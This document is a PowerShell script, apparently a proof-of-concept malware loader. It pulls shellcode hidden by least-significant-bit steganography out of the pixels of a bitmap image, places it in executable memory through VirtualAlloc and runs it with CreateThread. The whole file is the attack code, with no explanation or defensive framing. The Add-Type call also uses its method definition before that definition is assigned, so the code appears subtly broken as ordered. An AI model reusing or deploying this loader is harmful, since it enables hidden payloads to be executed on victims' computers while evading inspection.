[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru

# [string] $filename = ".\samples\howareyou.bmp"
[string] $filename = ".\samples\helpme.bmp"
[Int32] $length = 2208

$MethodDefinition =
@'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, UInt32 lpThreadId);
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
'@


function get_lsb([byte]$target, [byte]$source) { 
    $a = $target -shl 1
    $b = $source -band 1
    $a -bor $b
}

function get_payload($length) {
    [Int32]$pos = 0
    $BitMap = [System.Drawing.Image]::FromFile((Get-Item $filename).fullname, $true)
    $bytes = New-Object byte[] ($length)

    foreach($y in (($BitMap.Height-1)..0)) {
        foreach($x in (0..($BitMap.Width-1))) {
            $Pixel = $BitMap.GetPixel($x,$y)
            $B = $Pixel | Select-Object -ExpandProperty B
            $G = $Pixel | Select-Object -ExpandProperty G
            $R = $Pixel | Select-Object -ExpandProperty R

            # "($B, $G, $R)"
            
            foreach ($byte in ($B, $G, $R)) {
                if ($length -le 0) {
                    return $bytes
                }

                $idx = [int][Math]::Floor($pos / 8)
                $bytes[$idx] = get_lsb $bytes[$idx] $byte
                
                $pos += 1
                $length -= 1
            }
        }
    }
}


$payload_data = get_payload $length

[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length / 8), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length / 8))
$Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)

Start-Sleep -s 3
